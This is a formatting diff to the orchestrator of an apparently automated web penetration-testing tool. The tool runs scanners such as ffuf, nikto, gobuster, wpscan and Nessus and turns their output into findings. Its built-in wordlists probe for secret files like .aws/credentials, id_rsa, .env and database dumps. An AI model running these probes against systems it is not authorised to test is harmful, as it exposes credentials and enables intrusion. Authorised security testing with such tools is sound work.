-                    "database.sql", "db.sql", "dump.sql", "data.sql",
-                    "site.zip", "www.zip", "html.zip", "public.zip",
-                    "backup", "bak", "old", "archive",
+                    "backup.sql",
+                    "backup.zip",
+                    "backup.tar.gz",
+                    "backup.tar",
+                    "database.sql",
+                    "db.sql",
+                    "dump.sql",
+                    "data.sql",
+                    "site.zip",
+                    "www.zip",
+                    "html.zip",
+                    "public.zip",
+                    "backup",
+                    "bak",
+                    "old",
+                    "archive",
                     # Package managers
-                    "composer.json", "composer.lock", "package.json", "package-lock.json",
-                    "yarn.lock", "Gemfile", "Gemfile.lock", "requirements.txt",
-                    "Pipfile", "Pipfile.lock", "pom.xml", "build.gradle",
+                    "composer.json",
+                    "composer.lock",
+                    "package.json",
+                    "package-lock.json",
+                    "yarn.lock",
+                    "Gemfile",
+                    "Gemfile.lock",
+                    "requirements.txt",
+                    "Pipfile",
+                    "Pipfile.lock",
+                    "pom.xml",
+                    "build.gradle",
                     # Debug/Info pages
-                    "phpinfo.php", "info.php", "test.php", "debug.php",
-                    "server-info", "server-status", "debug", "trace",
-                    "actuator", "actuator/health", "actuator/env", "actuator/info",
-                    "metrics", "health", "healthcheck", "health-check",
+                    "phpinfo.php",
+                    "info.php",
+                    "test.php",
+                    "debug.php",
+                    "server-info",
+                    "server-status",
+                    "debug",
+                    "trace",
+                    "actuator",
+                    "actuator/health",
+                    "actuator/env",
+                    "actuator/info",
+                    "metrics",
+                    "health",
+                    "healthcheck",
+                    "health-check",
                     # Admin panels
-                    "admin", "administrator", "admin.php", "admin.html",
-                    "wp-admin", "wp-login.php", "cpanel", "plesk",
-                    "manager", "console", "portal", "backend",
+                    "admin",
+                    "administrator",
+                    "admin.php",
+                    "admin.html",
+                    "wp-admin",
+                    "wp-login.php",
+                    "cpanel",
+                    "plesk",
+                    "manager",
+                    "console",
+                    "portal",
+                    "backend",
                     # Logs
-                    "debug.log", "error.log", "access.log", "app.log",
-                    "laravel.log", "storage/logs", "logs", "log",
+                    "debug.log",
+                    "error.log",
+                    "access.log",
+                    "app.log",
+                    "laravel.log",
+                    "storage/logs",
+                    "logs",
+                    "log",
                     # AWS/Cloud
-                    ".aws", ".aws/credentials", "aws.yml", "s3.yml",
+                    ".aws",
+                    ".aws/credentials",
+                    "aws.yml",
+                    "s3.yml",
                     # Docker/K8s
-                    "docker-compose.yml", "docker-compose.yaml", "Dockerfile",
-                    ".dockerenv", "kubernetes.yml", "k8s.yml",
+                    "docker-compose.yml",
+                    "docker-compose.yaml",
+                    "Dockerfile",
+                    ".dockerenv",
+                    "kubernetes.yml",
+                    "k8s.yml",
                     # CI/CD
-                    ".travis.yml", ".gitlab-ci.yml", "Jenkinsfile",
-                    ".circleci/config.yml", ".github/workflows",
+                    ".travis.yml",
+                    ".gitlab-ci.yml",
+                    "Jenkinsfile",
+                    ".circleci/config.yml",
+                    ".github/workflows",
                     # Misc sensitive
-                    "crossdomain.xml", "clientaccesspolicy.xml",
-                    ".DS_Store", "Thumbs.db", ".idea", ".vscode",
-                    "id_rsa", "id_rsa.pub", ".ssh", "known_hosts",
-                    "readme.html", "readme.md", "readme.txt", "CHANGELOG.md",
-                    "LICENSE", "VERSION", "INSTALL", "TODO",
+                    "crossdomain.xml",
+                    "clientaccesspolicy.xml",
+                    ".DS_Store",
+                    "Thumbs.db",
+                    ".idea",
+                    ".vscode",
+                    "id_rsa",
+                    "id_rsa.pub",
+                    ".ssh",
+                    "known_hosts",
+                    "readme.html",
+                    "readme.md",
+                    "readme.txt",
+                    "CHANGELOG.md",
+                    "LICENSE",
+                    "VERSION",
+                    "INSTALL",
+                    "TODO",
                 ]
                 fallback_wordlist.write_text("\n".join(fallback_words))
                 wordlist = str(fallback_wordlist)
@@ -3604,7 +3994,7 @@ class Orchestrator:
                 # Use JSON output for reliable parsing
                 ret, output = await self._run_command(
                     f"ffuf -u {self.safe_target}/FUZZ -w {wordlist} -mc 200,301,302,403 -t 50 -o {ffuf_output_file} -of json 2>&1",
-                    timeout=300
+                    timeout=300,
                 )
                 tool_elapsed = time.time() - tool_start
 
@@ -3631,19 +4021,31 @@ class Orchestrator:
                     tools_run.append("ffuf")
 
                     # Add interesting paths as findings
-                    interesting_patterns = ["admin", "backup", "config", "db", "database", "api", "upload", "shell", "test"]
+                    interesting_patterns = [
+                        "admin",
+                        "backup",
+                        "config",
+                        "db",
+                        "database",
+                        "api",
+                        "upload",
+                        "shell",
+                        "test",
+                    ]
                     for path in found_paths[:50]:  # Limit to first 50
                         is_interesting = any(p in path.lower() for p in interesting_patterns)
                         if is_interesting:
-                            findings.append(Finding(
-                                type="directory_discovery",
-                                value=path,
-                                description=f"Potentially sensitive directory discovered: {path}",
-                                severity="low",
-                                phase="scan",
-                                tool="ffuf",
-                                target=self.target
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="directory_discovery",
+                                    value=path,
+                                    description=f"Potentially sensitive directory discovered: {path}",
+                                    severity="low",
+                                    phase="scan",
+                                    tool="ffuf",
+                                    target=self.target,
+                                )
+                            )
 
                     # Save ffuf structured findings JSON
                     ffuf_findings_list = [f for f in findings if f.tool == "ffuf"]
@@ -3662,10 +4064,10 @@ class Orchestrator:
                                 "description": f.description,
                                 "severity": f.severity,
                                 "tool": f.tool,
-                                "target": f.target
+                                "target": f.target,
                             }
                             for f in ffuf_findings_list
-                        ]
+                        ],
                     }
                     ffuf_findings_json_path.write_text(json.dumps(ffuf_findings_data, indent=2))
 
@@ -3680,7 +4082,7 @@ class Orchestrator:
                         "status": "no_paths",
                         "path_count": 0,
                         "finding_count": 0,
-                        "findings": []
+                        "findings": [],
                     }
                     ffuf_findings_json_path.write_text(json.dumps(ffuf_findings_data, indent=2))
                     ffuf_txt_file.write_text("")
@@ -3695,7 +4097,7 @@ class Orchestrator:
             nikto_output_file = self.output_dir / f"nikto_{self.domain}.txt"
             ret, output = await self._run_command(
                 f"nikto -h {self.safe_target} -Format txt -output {nikto_output_file} -Tuning 123bde 2>/dev/null",
-                timeout=600
+                timeout=600,
             )
             tool_elapsed = time.time() - tool_start
 
@@ -3709,23 +4111,79 @@ class Orchestrator:
 
                 # Security header patterns to detect
                 header_findings = {
-                    "x-frame-options": ("medium", "Missing X-Frame-Options header - Clickjacking possible", "missing_header"),
-                    "strict-transport-security": ("medium", "Missing HSTS header - Downgrade attacks possible", "missing_header"),
-                    "x-content-type-options": ("low", "Missing X-Content-Type-Options - MIME sniffing possible", "missing_header"),
-                    "breach": ("low", "Potential BREACH vulnerability - HTTP compression on HTTPS", "potential_vulnerability"),
-                    "access-control-allow-origin": ("medium", "Overly permissive CORS policy detected", "cors_misconfiguration"),
-                    "server leaks inodes": ("low", "Server information disclosure via headers", "information_disclosure"),
-                    "x-powered-by": ("info", "Server technology disclosed via X-Powered-By header", "information_disclosure"),
-                    "retrieved x-powered-by": ("info", "Server technology disclosed via X-Powered-By header", "information_disclosure"),
-                    "uncommon header": ("info", "Uncommon HTTP header detected", "information_disclosure"),
-                    "retrieved access-control": ("medium", "CORS headers present - overly permissive (*)", "cors_misconfiguration"),
+                    "x-frame-options": (
+                        "medium",
+                        "Missing X-Frame-Options header - Clickjacking possible",
+                        "missing_header",
+                    ),
+                    "strict-transport-security": (
+                        "medium",
+                        "Missing HSTS header - Downgrade attacks possible",
+                        "missing_header",
+                    ),
+                    "x-content-type-options": (
+                        "low",
+                        "Missing X-Content-Type-Options - MIME sniffing possible",
+                        "missing_header",
+                    ),
+                    "breach": (
+                        "low",
+                        "Potential BREACH vulnerability - HTTP compression on HTTPS",
+                        "potential_vulnerability",
+                    ),
+                    "access-control-allow-origin": (
+                        "medium",
+                        "Overly permissive CORS policy detected",
+                        "cors_misconfiguration",
+                    ),
+                    "server leaks inodes": (
+                        "low",
+                        "Server information disclosure via headers",
+                        "information_disclosure",
+                    ),
+                    "x-powered-by": (
+                        "info",
+                        "Server technology disclosed via X-Powered-By header",
+                        "information_disclosure",
+                    ),
+                    "retrieved x-powered-by": (
+                        "info",
+                        "Server technology disclosed via X-Powered-By header",
+                        "information_disclosure",
+                    ),
+                    "uncommon header": (
+                        "info",
+                        "Uncommon HTTP header detected",
+                        "information_disclosure",
+                    ),
+                    "retrieved access-control": (
+                        "medium",
+                        "CORS headers present - overly permissive (*)",
+                        "cors_misconfiguration",
+                    ),
                     "cookie": ("medium", "Cookie security issue detected", "insecure_cookie"),
-                    "without the secure flag": ("medium", "Cookie without secure flag - transmitted over HTTP", "insecure_cookie"),
-                    "without the httponly flag": ("medium", "Cookie without httponly flag - accessible via JavaScript", "insecure_cookie"),
+                    "without the secure flag": (
+                        "medium",
+                        "Cookie without secure flag - transmitted over HTTP",
+                        "insecure_cookie",
+                    ),
+                    "without the httponly flag": (
+                        "medium",
+                        "Cookie without httponly flag - accessible via JavaScript",
+                        "insecure_cookie",
+                    ),
                 }
 
                 # Vulnerability patterns
-                vuln_patterns = ["osvdb", "vulnerability", "outdated", "cve-", "backdoor", "remote code", "injection"]
+                vuln_patterns = [
+                    "osvdb",
+                    "vulnerability",
+                    "outdated",
+                    "cve-",
+                    "backdoor",
+                    "remote code",
+                    "injection",
+                ]
 
                 # Parse nikto findings
                 for line in nikto_output.split("\n"):
@@ -3739,35 +4197,47 @@ class Orchestrator:
                     for vuln_pattern in vuln_patterns:
                         if vuln_pattern in line_lower:
                             severity = "medium"
-                            if "critical" in line_lower or "remote" in line_lower or "backdoor" in line_lower:
+                            if (
+                                "critical" in line_lower
+                                or "remote" in line_lower
+                                or "backdoor" in line_lower
+                            ):
                                 severity = "high"
                             elif "cve-" in line_lower:
                                 severity = "high"
-                            findings.append(Finding(
-                                type="web_vulnerability",
-                                value=line.strip()[:200],
-                                description=line.strip()[:500],
-                                severity=severity,
-                                phase="scan",
-                                tool="nikto",
-                                target=self.target
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="web_vulnerability",
+                                    value=line.strip()[:200],
+                                    description=line.strip()[:500],
+                                    severity=severity,
+                                    phase="scan",
+                                    tool="nikto",
+                                    target=self.target,
+                                )
+                            )
                             matched = True
                             break
 
                     # Check for header/info patterns if no vuln matched
                     if not matched:
-                        for pattern, (severity, description, finding_type) in header_findings.items():
+                        for pattern, (
+                            severity,
+                            description,
+                            finding_type,
+                        ) in header_findings.items():
                             if pattern in line_lower:
-                                findings.append(Finding(
-                                    type=finding_type,
-                                    value=pattern.replace("-", " ").title(),
-                                    description=f"{description}. Details: {line.strip()[:200]}",
-                                    severity=severity,
-                                    phase="scan",
-                                    tool="nikto",
-                                    target=self.target
-                                ))
+                                findings.append(
+                                    Finding(
+                                        type=finding_type,
+                                        value=pattern.replace("-", " ").title(),
+                                        description=f"{description}. Details: {line.strip()[:200]}",
+                                        severity=severity,
+                                        phase="scan",
+                                        tool="nikto",
+                                        target=self.target,
+                                    )
+                                )
                                 matched = True
                                 break
 
@@ -3789,10 +4259,10 @@ class Orchestrator:
                             "description": f.description,
                             "severity": f.severity,
                             "tool": f.tool,
-                            "target": f.target
+                            "target": f.target,
                         }
                         for f in nikto_findings_list
-                    ]
+                    ],
                 }
                 nikto_json_path.write_text(json.dumps(nikto_json_data, indent=2))
 
@@ -3806,7 +4276,9 @@ class Orchestrator:
                 if output:
                     output_lower = output.lower()
                     if "error limit" in output_lower or "20 error" in output_lower:
-                        error_msg = "Rate limited - target likely behind CDN/WAF (error limit reached)"
+                        error_msg = (
+                            "Rate limited - target likely behind CDN/WAF (error limit reached)"
+                        )
                         status = "rate_limited"
                     elif "ssl connect failed" in output_lower or "ssl" in output_lower:
                         error_msg = "SSL connection failed - target may be blocking automated scans"
@@ -3831,7 +4303,7 @@ class Orchestrator:
                     "error": error_msg,
                     "finding_count": 0,
                     "findings": [],
-                    "note": "Target may be behind Cloudflare or other CDN/WAF. Consider authenticated scanning or manual testing."
+                    "note": "Target may be behind Cloudflare or other CDN/WAF. Consider authenticated scanning or manual testing.",
                 }
                 nikto_json_path.write_text(json.dumps(nikto_json_data, indent=2))
                 errors.append(f"nikto: {error_msg}")
@@ -3849,7 +4321,7 @@ class Orchestrator:
                 token_flag = f"--api-token {wpscan_token}" if wpscan_token else ""
                 ret, output = await self._run_command(
                     f"wpscan --url {self.safe_target} {token_flag} --enumerate vp,vt,u --format json --output {self.output_dir}/wpscan_{self.domain}.json 2>/dev/null",
-                    timeout=600
+                    timeout=600,
                 )
                 if ret == 0:
                     tools_run.append("wpscan")
@@ -3860,19 +4332,23 @@ class Orchestrator:
                             wpscan_data = json.loads(wpscan_file.read_text())
                             vulns = wpscan_data.get("vulnerabilities", [])
                             for vuln in vulns:
-                                findings.append(Finding(
-                                    type="wordpress_vulnerability",
-                                    value=vuln.get("title", "Unknown"),
-                                    description=vuln.get("description", vuln.get("title", "")),
-                                    severity=self._map_wpscan_severity(vuln.get("severity", "medium")),
-                                    phase="scan",
-                                    tool="wpscan",
-                                    target=self.target,
-                                    metadata={"cve": vuln.get("cve", [])}
-                                ))
+                                findings.append(
+                                    Finding(
+                                        type="wordpress_vulnerability",
+                                        value=vuln.get("title", "Unknown"),
+                                        description=vuln.get("description", vuln.get("title", "")),
+                                        severity=self._map_wpscan_severity(
+                                            vuln.get("severity", "medium")
+                                        ),
+                                        phase="scan",
+                                        tool="wpscan",
+                                        target=self.target,
+                                        metadata={"cve": vuln.get("cve", [])},
+                                    )
+                                )
                     except (json.JSONDecodeError, FileNotFoundError):
                         pass
-                    self._log_tool(f"wpscan - WordPress detected", "done")
+                    self._log_tool("wpscan - WordPress detected", "done")
             else:
                 self._log_tool("wpscan - Not WordPress, skipped", "done")
 
@@ -3881,7 +4357,7 @@ class Orchestrator:
             self._log_tool("testssl", "running")
             ret, output = await self._run_command(
                 f"testssl --jsonfile {self.output_dir}/testssl_{self.domain}.json --severity LOW {self.safe_domain} 2>/dev/null",
-                timeout=300
+                timeout=300,
             )
             if ret == 0:
                 (self.output_dir / f"testssl_{self.domain}.txt").write_text(output)
@@ -3892,15 +4368,17 @@ class Orchestrator:
                     if "VULNERABLE" in line or "NOT ok" in line:
                         ssl_issues.append(line.strip())
                         severity = "high" if "VULNERABLE" in line else "medium"
-                        findings.append(Finding(
-                            type="ssl_vulnerability",
-                            value=line.strip()[:100],
-                            description=line.strip(),
-                            severity=severity,
-                            phase="scan",
-                            tool="testssl",
-                            target=self.domain
-                        ))
+                        findings.append(
+                            Finding(
+                                type="ssl_vulnerability",
+                                value=line.strip()[:100],
+                                description=line.strip(),
+                                severity=severity,
+                                phase="scan",
+                                tool="testssl",
+                                target=self.domain,
+                            )
+                        )
                 # Save testssl structured findings JSON
                 testssl_findings_list = [f for f in findings if f.tool == "testssl"]
                 testssl_struct_json_path = self.output_dir / f"testssl_{self.domain}_findings.json"
@@ -3917,10 +4395,10 @@ class Orchestrator:
                             "description": f.description,
                             "severity": f.severity,
                             "tool": f.tool,
-                            "target": f.target
+                            "target": f.target,
                         }
                         for f in testssl_findings_list
-                    ]
+                    ],
                 }
                 testssl_struct_json_path.write_text(json.dumps(testssl_struct_data, indent=2))
 
@@ -3966,49 +4444,175 @@ class Orchestrator:
                 if not fallback_wordlist.exists():
                     fallback_words = [
                         # Common directories
-                        "admin", "administrator", "api", "app", "application", "assets",
-                        "backup", "backups", "bin", "cache", "cgi-bin", "config", "console",
-                        "css", "dashboard", "data", "database", "db", "debug", "dev",
-                        "docs", "downloads", "error", "files", "fonts", "home", "html",
-                        "images", "img", "includes", "install", "js", "lib", "log", "login",
-                        "logs", "mail", "media", "old", "panel", "php", "phpmyadmin",
-                        "private", "public", "robots.txt", "scripts", "server", "server-status",
-                        "setup", "shell", "sitemap.xml", "src", "static", "stats", "status",
-                        "storage", "system", "temp", "test", "tmp", "upload", "uploads",
-                        "user", "users", "var", "vendor", "web", "webmail", "wp-admin",
-                        "wp-content", "wp-includes", "wp-login.php", "xmlrpc.php",
+                        "admin",
+                        "administrator",
+                        "api",
+                        "app",
+                        "application",
+                        "assets",
+                        "backup",
+                        "backups",
+                        "bin",
+                        "cache",
+                        "cgi-bin",
+                        "config",
+                        "console",
+                        "css",
+                        "dashboard",
+                        "data",
+                        "database",
+                        "db",
+                        "debug",
+                        "dev",
+                        "docs",
+                        "downloads",
+                        "error",
+                        "files",
+                        "fonts",
+                        "home",
+                        "html",
+                        "images",
+                        "img",
+                        "includes",
+                        "install",
+                        "js",
+                        "lib",
+                        "log",
+                        "login",
+                        "logs",
+                        "mail",
+                        "media",
+                        "old",
+                        "panel",
+                        "php",
+                        "phpmyadmin",
+                        "private",
+                        "public",
+                        "robots.txt",
+                        "scripts",
+                        "server",
+                        "server-status",
+                        "setup",
+                        "shell",
+                        "sitemap.xml",
+                        "src",
+                        "static",
+                        "stats",
+                        "status",
+                        "storage",
+                        "system",
+                        "temp",
+                        "test",
+                        "tmp",
+                        "upload",
+                        "uploads",
+                        "user",
+                        "users",
+                        "var",
+                        "vendor",
+                        "web",
+                        "webmail",
+                        "wp-admin",
+                        "wp-content",
+                        "wp-includes",
+                        "wp-login.php",
+                        "xmlrpc.php",
                         # Sensitive environment/config files
-                        ".env", ".env.local", ".env.dev", ".env.prod", ".env.production",
-                        ".env.staging", ".env.backup", ".env.example", ".env.sample", ".env.old",
+                        ".env",
+                        ".env.local",
+                        ".env.dev",
+                        ".env.prod",
+                        ".env.production",
+                        ".env.staging",
+                        ".env.backup",
+                        ".env.example",
+                        ".env.sample",
+                        ".env.old",
                         # Swagger/OpenAPI/API docs
-                        "swagger", "swagger.json", "swagger.yaml", "swagger.yml",
-                        "swagger-ui", "swagger-ui.html", "swagger-resources",
-                        "api-docs", "api-docs.json", "openapi.json", "openapi.yaml",
-                        "v1/swagger.json", "v2/swagger.json", "api/swagger.json",
-                        "docs/api", "api/docs", "redoc", "graphql", "graphiql",
+                        "swagger",
+                        "swagger.json",
+                        "swagger.yaml",
+                        "swagger.yml",
+                        "swagger-ui",
+                        "swagger-ui.html",
+                        "swagger-resources",
+                        "api-docs",
+                        "api-docs.json",
+                        "openapi.json",
+                        "openapi.yaml",
+                        "v1/swagger.json",
+                        "v2/swagger.json",
+                        "api/swagger.json",
+                        "docs/api",
+                        "api/docs",
+                        "redoc",
+                        "graphql",
+                        "graphiql",
                         # Git/Version control
-                        ".git", ".git/config", ".git/HEAD", ".gitignore", ".svn", ".hg",
+                        ".git",
+                        ".git/config",
+                        ".git/HEAD",
+                        ".gitignore",
+                        ".svn",
+                        ".hg",
                         # Config files
-                        ".htaccess", ".htpasswd", "web.config", "config.php", "config.js",
-                        "config.json", "config.yaml", "settings.py", "application.yml",
+                        ".htaccess",
+                        ".htpasswd",
+                        "web.config",
+                        "config.php",
+                        "config.js",
+                        "config.json",
+                        "config.yaml",
+                        "settings.py",
+                        "application.yml",
                         "appsettings.json",
                         # Backup files
-                        "backup.sql", "backup.zip", "database.sql", "db.sql", "dump.sql",
-                        "site.zip", "www.zip",
+                        "backup.sql",
+                        "backup.zip",
+                        "database.sql",
+                        "db.sql",
+                        "dump.sql",
+                        "site.zip",
+                        "www.zip",
                         # Package managers
-                        "composer.json", "composer.lock", "package.json", "package-lock.json",
-                        "requirements.txt", "Pipfile", "pom.xml",
+                        "composer.json",
+                        "composer.lock",
+                        "package.json",
+                        "package-lock.json",
+                        "requirements.txt",
+                        "Pipfile",
+                        "pom.xml",
                         # Debug/Info pages
-                        "phpinfo.php", "info.php", "test.php", "debug.php",
-                        "server-info", "server-status", "actuator", "actuator/health",
-                        "actuator/env", "metrics", "health", "healthcheck",
+                        "phpinfo.php",
+                        "info.php",
+                        "test.php",
+                        "debug.php",
+                        "server-info",
+                        "server-status",
+                        "actuator",
+                        "actuator/health",
+                        "actuator/env",
+                        "metrics",
+                        "health",
+                        "healthcheck",
                         # Logs
-                        "debug.log", "error.log", "access.log", "app.log", "laravel.log",
+                        "debug.log",
+                        "error.log",
+                        "access.log",
+                        "app.log",
+                        "laravel.log",
                         # Docker/CI
-                        "docker-compose.yml", "Dockerfile", ".dockerenv",
-                        ".travis.yml", ".gitlab-ci.yml", "Jenkinsfile",
+                        "docker-compose.yml",
+                        "Dockerfile",
+                        ".dockerenv",
+                        ".travis.yml",
+                        ".gitlab-ci.yml",
+                        "Jenkinsfile",
                         # Misc sensitive
-                        "crossdomain.xml", ".DS_Store", "readme.html", "readme.md",
+                        "crossdomain.xml",
+                        ".DS_Store",
+                        "readme.html",
+                        "readme.md",
                     ]
                     fallback_wordlist.write_text("\n".join(fallback_words))
                 wordlist = str(fallback_wordlist)
@@ -4020,7 +4624,7 @@ class Orchestrator:
                 # Use output file for reliable results
                 ret, output = await self._run_command(
                     f"gobuster dir -u {self.safe_target} -w {wordlist} -q -t 20 --no-error --no-color -o {gobuster_output_file} 2>&1",
-                    timeout=300
+                    timeout=300,
                 )
                 tool_elapsed = time.time() - tool_start
 
@@ -4035,19 +4639,36 @@ class Orchestrator:
                     # Parse discovered paths
                     path_count = 0
                     for line in gobuster_output.split("\n"):
-                        if line.strip() and ("Status:" in line or "(Status:" in line or "/" in line):
+                        if line.strip() and (
+                            "Status:" in line or "(Status:" in line or "/" in line
+                        ):
                             path_count += 1
                             # Check for interesting paths
-                            if any(p in line.lower() for p in ["admin", "backup", "config", "api", "debug", ".git", "upload", "shell", "test"]):
-                                findings.append(Finding(
-                                    type="interesting_path",
-                                    value=line.strip()[:200],
-                                    description=f"Potentially sensitive path discovered: {line.strip()[:100]}",
-                                    severity="low",
-                                    phase="scan",
-                                    tool="gobuster",
-                                    target=self.target
-                                ))
+                            if any(
+                                p in line.lower()
+                                for p in [
+                                    "admin",
+                                    "backup",
+                                    "config",
+                                    "api",
+                                    "debug",
+                                    ".git",
+                                    "upload",
+                                    "shell",
+                                    "test",
+                                ]
+                            ):
+                                findings.append(
+                                    Finding(
+                                        type="interesting_path",
+                                        value=line.strip()[:200],
+                                        description=f"Potentially sensitive path discovered: {line.strip()[:100]}",
+                                        severity="low",
+                                        phase="scan",
+                                        tool="gobuster",
+                                        target=self.target,
+                                    )
+                                )
                     # Save gobuster JSON with findings
                     gobuster_findings_list = [f for f in findings if f.tool == "gobuster"]
                     gobuster_json_path = self.output_dir / f"gobuster_{self.domain}.json"
@@ -4065,10 +4686,10 @@ class Orchestrator:
                                 "description": f.description,
                                 "severity": f.severity,
                                 "tool": f.tool,
-                                "target": f.target
+                                "target": f.target,
                             }
                             for f in gobuster_findings_list
-                        ]
+                        ],
                     }
                     gobuster_json_path.write_text(json.dumps(gobuster_json_data, indent=2))
 
@@ -4083,7 +4704,7 @@ class Orchestrator:
                         "status": "no_paths",
                         "path_count": 0,
                         "finding_count": 0,
-                        "findings": []
+                        "findings": [],
                     }
                     gobuster_json_path.write_text(json.dumps(gobuster_json_data, indent=2))
                     gobuster_output_file.write_text("")
@@ -4098,7 +4719,7 @@ class Orchestrator:
             dirsearch_txt_file = self.output_dir / f"dirsearch_{self.domain}.txt"
             ret, output = await self._run_command(
                 f"dirsearch -u {self.safe_target} -e php,asp,aspx,jsp,html,js -t 20 --format plain -o {dirsearch_txt_file} 2>/dev/null",
-                timeout=300
+                timeout=300,
             )
             tool_elapsed = time.time() - tool_start
 
@@ -4115,16 +4736,31 @@ class Orchestrator:
                             dirsearch_paths.append(line)
 
                             # Check for interesting paths and add as findings
-                            if any(p in line.lower() for p in ["admin", "backup", "config", "api", "debug", ".git", "upload", "shell", "test"]):
-                                findings.append(Finding(
-                                    type="interesting_path",
-                                    value=line[:200],
-                                    description=f"Potentially sensitive path discovered: {line[:100]}",
-                                    severity="low",
-                                    phase="scan",
-                                    tool="dirsearch",
-                                    target=self.target
-                                ))
+                            if any(
+                                p in line.lower()
+                                for p in [
+                                    "admin",
+                                    "backup",
+                                    "config",
+                                    "api",
+                                    "debug",
+                                    ".git",
+                                    "upload",
+                                    "shell",
+                                    "test",
+                                ]
+                            ):
+                                findings.append(
+                                    Finding(
+                                        type="interesting_path",
+                                        value=line[:200],
+                                        description=f"Potentially sensitive path discovered: {line[:100]}",
+                                        severity="low",
+                                        phase="scan",
+                                        tool="dirsearch",
+                                        target=self.target,
+                                    )
+                                )
 
                 # Save dirsearch JSON
                 dirsearch_findings_list = [f for f in findings if f.tool == "dirsearch"]
@@ -4143,10 +4779,10 @@ class Orchestrator:
                             "description": f.description,
                             "severity": f.severity,
                             "tool": f.tool,
-                            "target": f.target
+                            "target": f.target,
                         }
                         for f in dirsearch_findings_list
-                    ]
+                    ],
                 }
                 dirsearch_json_path.write_text(json.dumps(dirsearch_json_data, indent=2))
 
@@ -4167,7 +4803,9 @@ class Orchestrator:
                     }
                     profile = profile_map.get(self.config.acunetix_profile, ScanProfile.FULL_SCAN)
 
-                    scan_id = acunetix.scan_url(self.target, profile, f"AIPT Scan - {self.timestamp}")
+                    scan_id = acunetix.scan_url(
+                        self.target, profile, f"AIPT Scan - {self.timestamp}"
+                    )
                     self.scan_ids["acunetix"] = scan_id
 
                     # Save scan info
@@ -4176,12 +4814,17 @@ class Orchestrator:
                         "target": self.target,
                         "profile": self.config.acunetix_profile,
                         "started_at": datetime.now(timezone.utc).isoformat(),
-                        "dashboard_url": f"{acunetix.config.base_url}/#/scans/{scan_id}"
+                        "dashboard_url": f"{acunetix.config.base_url}/#/scans/{scan_id}",
                     }
-                    (self.output_dir / "acunetix_scan.json").write_text(json.dumps(scan_info, indent=2), encoding="utf-8")
+                    (self.output_dir / "acunetix_scan.json").write_text(
+                        json.dumps(scan_info, indent=2), encoding="utf-8"
+                    )
 
                     tools_run.append("acunetix")
-                    self._log_tool(f"Acunetix - Scan started: {scan_id[:8]}... (results collected at end)", "done")
+                    self._log_tool(
+                        f"Acunetix - Scan started: {scan_id[:8]}... (results collected at end)",
+                        "done",
+                    )
                     # NOTE: Don't wait here - continue with other tools
                     # Results will be collected in the final scanner collection phase
                 else:
@@ -4214,10 +4857,13 @@ class Orchestrator:
                 if nessus.connect():
                     # Extract host/IP from target URL for network scanning
                     from urllib.parse import urlparse
+
                     parsed = urlparse(self.target)
                     target_host = parsed.hostname or self.target
 
-                    scan_id = nessus.scan_host(target_host, template="basic", name=f"AIPT-{self.timestamp}")
+                    scan_id = nessus.scan_host(
+                        target_host, template="basic", name=f"AIPT-{self.timestamp}"
+                    )
                     self.scan_ids["nessus"] = scan_id
 
                     # Save scan info
@@ -4226,10 +4872,14 @@ class Orchestrator:
                         "target": target_host,
                         "started_at": datetime.now(timezone.utc).isoformat(),
                     }
-                    (self.output_dir / "nessus_scan.json").write_text(json.dumps(scan_info, indent=2), encoding="utf-8")
+                    (self.output_dir / "nessus_scan.json").write_text(
+                        json.dumps(scan_info, indent=2), encoding="utf-8"
+                    )
 
                     tools_run.append("nessus")
-                    self._log_tool(f"Nessus - Scan started: {scan_id} (results collected at end)", "done")
+                    self._log_tool(
+                        f"Nessus - Scan started: {scan_id} (results collected at end)", "done"
+                    )
                     # NOTE: Don't wait here - continue with other tools
                     # Results will be collected in the final scanner collection phase
                 else:
@@ -4255,10 +4905,14 @@ class Orchestrator:
                         "target": self.target,
                         "started_at": datetime.now(timezone.utc).isoformat(),
                     }
-                    (self.output_dir / "zap_scan.json").write_text(json.dumps(scan_info, indent=2), encoding="utf-8")
+                    (self.output_dir / "zap_scan.json").write_text(
+                        json.dumps(scan_info, indent=2), encoding="utf-8"
+                    )
 
                     tools_run.append("zap")
-                    self._log_tool(f"OWASP ZAP - Scan started: {scan_id} (results collected at end)", "done")
+                    self._log_tool(
+                        f"OWASP ZAP - Scan started: {scan_id} (results collected at end)", "done"
+                    )
                     # NOTE: Don't wait here - continue with other tools
                     # Results will be collected in the final scanner collection phase
                 else:
@@ -4280,14 +4934,14 @@ class Orchestrator:
                 # First, try to detect Docker presence via common paths
                 ret, output = await self._run_command(
                     f"curl -sI {self.safe_target}/docker-compose.yml --connect-timeout 5 | head -1",
-                    timeout=10
+                    timeout=10,
                 )
                 has_docker = "200" in output
 
                 # Scan web target for container-related vulnerabilities
                 ret, trivy_output = await self._run_command(
                     f"trivy fs --severity {self.config.trivy_severity} --format json --output {self.output_dir}/trivy_{self.domain}.json . 2>/dev/null",
-                    timeout=300
+                    timeout=300,
                 )
                 if ret == 0:
                     tools_run.append("trivy")
@@ -4299,22 +4953,28 @@ class Orchestrator:
                             for result in trivy_data.get("Results", []):
                                 for vuln in result.get("Vulnerabilities", []):
                                     severity = vuln.get("Severity", "UNKNOWN").lower()
-                                    findings.append(Finding(
-                                        type="container_vulnerability",
-                                        value=vuln.get("VulnerabilityID", "Unknown"),
-                                        description=f"{vuln.get('PkgName', '')}: {vuln.get('Title', vuln.get('VulnerabilityID', ''))}",
-                                        severity=severity if severity in ["critical", "high", "medium", "low"] else "medium",
-                                        phase="scan",
-                                        tool="trivy",
-                                        target=self.target,
-                                        metadata={
-                                            "cve": vuln.get("VulnerabilityID"),
-                                            "package": vuln.get("PkgName"),
-                                            "installed_version": vuln.get("InstalledVersion"),
-                                            "fixed_version": vuln.get("FixedVersion"),
-                                            "cvss": vuln.get("CVSS", {})
-                                        }
-                                    ))
+                                    findings.append(
+                                        Finding(
+                                            type="container_vulnerability",
+                                            value=vuln.get("VulnerabilityID", "Unknown"),
+                                            description=f"{vuln.get('PkgName', '')}: {vuln.get('Title', vuln.get('VulnerabilityID', ''))}",
+                                            severity=(
+                                                severity
+                                                if severity in ["critical", "high", "medium", "low"]
+                                                else "medium"
+                                            ),
+                                            phase="scan",
+                                            tool="trivy",
+                                            target=self.target,
+                                            metadata={
+                                                "cve": vuln.get("VulnerabilityID"),
+                                                "package": vuln.get("PkgName"),
+                                                "installed_version": vuln.get("InstalledVersion"),
+                                                "fixed_version": vuln.get("FixedVersion"),
+                                                "cvss": vuln.get("CVSS", {}),
+                                            },
+                                        )
+                                    )
                         except (json.JSONDecodeError, FileNotFoundError):
                             pass
